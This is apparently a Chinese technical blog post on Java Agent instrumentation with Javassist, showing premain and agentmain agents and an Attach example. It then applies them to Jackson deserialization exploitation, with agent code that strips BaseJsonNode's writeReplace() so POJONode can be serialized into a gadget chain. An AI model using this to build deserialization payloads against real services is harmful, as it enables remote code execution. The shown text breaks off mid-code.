<p>JVM会执行premain方法，大部分加载会通过这个方法，除了一些系统类先于agent执行，用户类的加载肯定是会被拦截的。拦截类然后结合javassist来修改字节码</p>
<p>有两种模式：</p>
<h4 id="1-premain-模式"><a href="#1-premain-模式" class="headerlink" title="(1) premain 模式"></a>(1) premain 模式</h4><ul>
<li>在目标应用启动时，通过 JVM 参数 <code>-javaagent:xxx.jar</code> 指定 agent。</li>
<li>在 <code>main()</code> 方法执行前，会自动执行 <code>agent</code> 中的 <code>premain()</code> 方法。</li>
</ul>
<h4 id="2-agentmain-模式"><a href="#2-agentmain-模式" class="headerlink" title="(2) agentmain 模式"></a>(2) agentmain 模式</h4><ul>
<li>在应用运行过程中，动态加载 agent。</li>
<li>通常通过 <code>Attach API</code>（如 <code>VirtualMachine.attach()</code>）注入。</li>
<li>在注入后，<code>agentmain()</code> 会被调用。</li>
</ul>
<p>Java Agent 的入口类必须包含以下方法之一：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 在 JVM 启动前调用</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span>;<br><br><span class="hljs-comment">// 或者（可选，少一个参数）</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String agentArgs)</span>;<br><br><span class="hljs-comment">// 在 JVM 运行时动态 attach 时调用</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span>;<br></code></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li><code>agentArgs</code>：运行 <code>-javaagent:xxx.jar=参数</code> 时传入的字符串参数。</li>
<li><code>Instrumentation inst</code>：字节码修改的核心接口，可用来拦截类加载。</li>
</ul>
<p>JavaAgent 是 Java 的 <strong>字节码插桩机制</strong>，可以在 <strong>类加载时</strong> 或 <strong>运行时（重定义类）</strong> 动态修改类的字节码。<br> 其核心是 <code>Instrumentation</code> 接口，允许你注册一个 <code>ClassFileTransformer</code> 来拦截类的加载过程，并可以对其字节码做修改。</p>
<p><strong>类加载拦截流程</strong>：</p>
<ol>
<li>JVM 启动时，指定 <code>-javaagent:myagent.jar</code>。</li>
<li>JVM 在加载应用类之前，会先加载 Agent。</li>
<li>Agent 调用 <code>premain(String args, Instrumentation inst)</code>。</li>
<li>我们在 <code>inst.addTransformer()</code> 注册一个 <code>ClassFileTransformer</code>。</li>
<li>当某个类第一次加载时，JVM 会把原始字节码（<code>byte[]</code>）交给 <code>transform()</code> 方法。</li>
<li>在 <code>transform()</code> 里，我们可以用 <strong>Javassist</strong> 等工具修改字节码，然后返回修改后的 <code>byte[]</code>。</li>
</ol>
<p><code>transform</code>的方法参数</p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202507221056608.png" srcset="/img/loading.gif" lazyload alt="image-20250722105636902"></p>
<p><code>transform()</code> <strong>必须在类加载前触发</strong>，因为类一旦加载，修改会比较麻烦（需要 <code>retransformClasses()</code> 或者 Unsafe 技术）。因此我们用 <code>-javaagent</code> 是为了在 <strong>应用主类加载前</strong> 把 Agent 挂上。</p>
<p>那整体的步骤就是：</p>
<h5 id="Agent类"><a href="#Agent类" class="headerlink" title="Agent类"></a>Agent类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAgent</span> &#123;<br>    <span class="hljs-comment">// premain 在 main() 之前执行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;[MyAgent] premain called with args: &quot;</span> + agentArgs);<br>        <span class="hljs-comment">// 可以在这里添加 Transformer</span><br>        inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyTransformer</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="编写Transformer"><a href="#编写Transformer" class="headerlink" title="编写Transformer"></a>编写Transformer</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, <br>                            String className, <br>                            Class&lt;?&gt; classBeingRedefined,ProtectionDomain protectionDomain, <br>                            <span class="hljs-type">byte</span>[] classfileBuffer) &#123;<br>        System.out.println(<span class="hljs-string">&quot;[MyTransformer] Transforming: &quot;</span> + className);<br>        <span class="hljs-comment">// 这里可以用 Javassist 修改字节码</span><br>        <span class="hljs-keyword">return</span> classfileBuffer; <span class="hljs-comment">// 不修改，原样返回</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="通过Attach动态加载"><a href="#通过Attach动态加载" class="headerlink" title="通过Attach动态加载"></a>通过Attach动态加载</h4><h5 id="agebtmain代码"><a href="#agebtmain代码" class="headerlink" title="agebtmain代码"></a>agebtmain代码</h5><p>如果目标 JVM 已经在运行，可以通过 Attach API 动态加载 agent：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;[MyAgent] agentmain called with args: &quot;</span> + agentArgs);<br>    inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyTransformer</span>(), <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="Attach代码"><a href="#Attach代码" class="headerlink" title="Attach代码"></a>Attach代码</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Attacher</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">vm</span> <span class="hljs-operator">=</span> VirtualMachine.attach(<span class="hljs-string">&quot;12345&quot;</span>); <span class="hljs-comment">// 目标 JVM PID</span><br>        vm.loadAgent(<span class="hljs-string">&quot;myagent.jar&quot;</span>, <span class="hljs-string">&quot;DynamicLoad&quot;</span>);<br>        vm.detach();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h5 id="结合Javassist修改"><a href="#结合Javassist修改" class="headerlink" title="结合Javassist修改"></a>结合Javassist修改</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined,<br>                            ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) &#123;<br>        <span class="hljs-keyword">if</span> (className.equals(<span class="hljs-string">&quot;target/HelloWorld&quot;</span>)) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>                <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(classfileBuffer));<br>                <span class="hljs-type">CtMethod</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;sayHello&quot;</span>);<br>                method.insertBefore(<span class="hljs-string">&quot;&#123; System.out.println(\&quot;[Agent Injected]\&quot;); &#125;&quot;</span>);<br>                <span class="hljs-keyword">return</span> ctClass.toBytecode();<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> classfileBuffer;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ol>
<li><p><strong>Instrumentation API 不能修改已经加载的 JDK 核心类（除非使用 bootstrapClassLoader 或 redefineClasses）。</strong></p>
</li>
<li><p><code>addTransformer</code> 默认只拦截 <strong>新加载的类</strong>，如果需要重新定义，必须使用：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">inst.addTransformer(transformer, <span class="hljs-literal">true</span>);<br>inst.retransformClasses(targetClass);<br></code></pre></td></tr></table></figure>
</li>
<li><p><code>-javaagent</code> 的 jar 必须包含 <code>Premain-Class</code> 指定的入口。</p>
</li>
</ol>
<h4 id="Javassist-删除方法的核心语法"><a href="#Javassist-删除方法的核心语法" class="headerlink" title="Javassist 删除方法的核心语法"></a><strong>Javassist 删除方法的核心语法</strong></h4><ul>
<li><p><strong>删除方法</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtMethod</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;asText&quot;</span>);<br>ctClass.removeMethod(m);<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>替换方法</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtMethod</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;asText&quot;</span>);<br>m.setBody(<span class="hljs-string">&quot;&#123; return \&quot;evil\&quot;; &#125;&quot;</span>);<br></code></pre></td></tr></table></figure></li>
</ul>
<h4 id="在jackson反序列化中的POJONode中就会用到"><a href="#在jackson反序列化中的POJONode中就会用到" class="headerlink" title="在jackson反序列化中的POJONode中就会用到"></a>在jackson反序列化中的POJONode中就会用到</h4><p>当我们调用 <code>ObjectOutputStream.writeObject(obj)</code> 时，JVM 会先检查：</p>
<ul>
<li>是否实现了 <code>writeReplace()</code>（优先调用该方法返回新对象替代原对象）。</li>
<li>然后再检查 <code>writeObject()</code> 等序列化方法。</li>
</ul>
<p><strong>在 Jackson 的 <code>BaseJsonNode</code> 中</strong>，<code>writeReplace()</code> 被设计为防御手段，如果我们试图序列化 <code>POJONode</code>，会触发：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">writeReplace</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NotSerializableException</span>(<span class="hljs-string">&quot;POJONode is not meant for direct serialization&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这样直接阻断序列化。</p>
<p><strong>利用链中需要绕过它</strong>：<br> 因为 <code>POJONode</code> 的 <code>toString()</code> 或 <code>getValueAsText()</code> 可以触发任意 getter 调用，如果能序列化它，我们就能构建 gadget 链。<br> **所以必须用 Javassist + JavaAgent 动态移除 <code>writeReplace()</code>**，这样 <code>POJONode</code> 才能像普通对象一样被序列化。</p>
<h5 id="MyAgent"><a href="#MyAgent" class="headerlink" title="MyAgent"></a>MyAgent</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;[Agent] Starting agent with args: &quot;</span> + agentArgs);<br>        inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyTransformer</span>(), <span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h5 id="MyTransformer"><a href="#MyTransformer" class="headerlink" title="MyTransformer"></a>MyTransformer</h5><p>修改或者删除字节码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> agent;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> javassist.loader.LoaderClassPath;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className,<br>                            Class&lt;?&gt; classBeingRedefined,<br>                            ProtectionDomain protectionDomain,<br>                            <span class="hljs-type">byte</span>[] classfileBuffer) &#123;<br>        <span class="hljs-keyword">if</span> (className == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">cname</span> <span class="hljs-operator">=</span> className.replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-keyword">if</span> (loader != <span class="hljs-literal">null</span>) &#123;<br>                pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoaderClassPath</span>(loader));<br>            &#125;<br><br>            <span class="hljs-comment">// 针对 BaseJsonNode</span><br>            <span class="hljs-keyword">if</span> (cname.equals(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>)) &#123;<br>                System.out.println(<span class="hljs-string">&quot;[Agent] Found BaseJsonNode, removing writeReplace()...&quot;</span>);<br>                <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(classfileBuffer));<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>                    ctClass.removeMethod(writeReplace); <span class="hljs-comment">//删除</span><br>                    System.out.println(<span class="hljs-string">&quot;[Agent] writeReplace() removed!&quot;</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (NotFoundException e) &#123;<br>                    System.out.println(<span class="hljs-string">&quot;[Agent] No writeReplace() found.&quot;</span>);<br>                &#125;<br>                <span class="hljs-keyword">return</span> ctClass.toBytecode();<br>            &#125;<br><br>            <span class="hljs-comment">// 针对 POJONode，可选修改 toString() 便于调试/利用</span><br>            <span class="hljs-keyword">if</span> (cname.equals(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.POJONode&quot;</span>)) &#123;<br>                System.out.println(<span class="hljs-string">&quot;[Agent] Found POJONode, patching toString()...&quot;</span>);<br>                <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(classfileBuffer));<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">CtMethod</span> <span class="hljs-variable">toStringMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;toString&quot;</span>);<br>                    toStringMethod.setBody(<span class="hljs-string">&quot;&#123; return \&quot;[POJONode patched by Agent]\&quot;; &#125;&quot;</span>);<br>                    System.out.println(<span class="hljs-string">&quot;[Agent] toString() modified.&quot;</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (NotFoundException e) &#123;<br>                    System.out.println(<span class="hljs-string">&quot;[Agent] No toString() found.&quot;</span>);<br>                &#125;<br>                <span class="hljs-keyword">return</span> ctClass.toBytecode();<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 不修改其他类</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h5 id="MANIFEST-MF"><a href="#MANIFEST-MF" class="headerlink" title="MANIFEST.MF"></a>MANIFEST.MF</h5><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Manifest-Version: 1.0</span><br><span class="hljs-section">Premain-Class: agent.MyAgent</span><br></code></pre></td></tr></table></figure>

<p>打包时可以用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">jar cmf MANIFEST.MF agent.jar -C out/production/JavaAgentDemo .<br></code></pre></td></tr></table></figure>

<p>使用 <code>-javaagent</code> 参数启动你的目标程序：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -javaagent:agent.jar -jar target-app.jar<br></code></pre></td></tr></table></figure>

<p>这样在目标应用启动时，<code>BaseJsonNode</code> 和 <code>POJONode</code> 会自动被修改。</p>
<h4 id="动态修改"><a href="#动态修改" class="headerlink" title="动态修改"></a>动态修改</h4><h5 id="1-Agent-代码（MyAgent-java）"><a href="#1-Agent-代码（MyAgent-java）" class="headerlink" title="1. Agent 代码（MyAgent.java）"></a>1. Agent 代码（<code>MyAgent.java</code>）</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> agent;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> java.lang.instrument.*;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAgent</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;[Agent] Started via premain&quot;</span>);<br>        inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyTransformer</span>(), <span class="hljs-literal">true</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;[Agent] Attached dynamically&quot;</span>);<br>        inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyTransformer</span>(), <span class="hljs-literal">true</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">for</span> (Class&lt;?&gt; clazz : inst.getAllLoadedClasses()) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>.equals(clazz.getName())<br>                        || <span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.POJONode&quot;</span>.equals(clazz.getName())) &#123;<br>                    System.out.println(<span class="hljs-string">&quot;[Agent] Retransforming class: &quot;</span> + clazz.getName());<br>                    <span class="hljs-keyword">if</span> (inst.isModifiableClass(clazz)) &#123;<br>                        inst.retransformClasses(clazz);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        System.out.println(<span class="hljs-string">&quot;[Agent] Class not modifiable: &quot;</span> + clazz.getName());<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// Transformer 负责修改字节码</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(Module <span class="hljs-keyword">module</span>, ClassLoader loader, String className,<br>                                Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain,<br>                                <span class="hljs-type">byte</span>[] classfileBuffer) &#123;<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">dotClassName</span> <span class="hljs-operator">=</span> className.replace(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>.equals(dotClassName)) &#123;<br>                System.out.println(<span class="hljs-string">&quot;[Agent] Transforming &quot;</span> + dotClassName);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>                    <span class="hljs-comment">// 重要：在运行时可能需要附加ClassLoader，否则找不到类</span><br>                    <span class="hljs-keyword">if</span> (loader != <span class="hljs-literal">null</span>) &#123;<br>                        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoaderClassPath</span>(loader));<br>                    &#125;<br><br>                    <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.get(dotClassName);<br><br>                    <span class="hljs-comment">// 删除 writeReplace 方法（如果存在）</span><br>                    <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplaceMethod</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        writeReplaceMethod = ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>                    &#125; <span class="hljs-keyword">catch</span> (NotFoundException e) &#123;<br>                        System.out.println(<span class="hljs-string">&quot;[Agent] writeReplace method not found, skipping deletion&quot;</span>);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (writeReplaceMethod != <span class="hljs-literal">null</span>) &#123;<br>                        ctClass.removeMethod(writeReplaceMethod);<br>                        System.out.println(<span class="hljs-string">&quot;[Agent] Removed writeReplace method&quot;</span>);<br>                    &#125;<br><br>                    <span class="hljs-type">byte</span>[] byteCode = ctClass.toBytecode();<br>                    ctClass.detach();<br>                    <span class="hljs-keyword">return</span> byteCode;<br><br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span 